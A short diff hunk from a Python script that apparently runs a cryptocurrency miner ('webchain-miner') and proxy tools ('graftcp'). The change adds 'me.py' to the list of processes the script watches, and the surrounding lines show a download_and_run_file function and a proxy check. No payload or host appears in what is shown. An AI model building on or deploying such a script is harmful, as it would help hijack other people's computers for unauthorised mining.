@@ -75,7 +75,7 @@ def download_and_run_file():
         print(f"Error downloading/running file: {e}")
 
 if __name__ == "__main__":
-    process_list = ['webchain-miner', 'gas', 'graftcp', 'graftcp-local']
+    process_list = ['webchain-miner', 'gas', 'graftcp', 'graftcp-local', 'me.py']
     
     while True:
         if check_proxy():
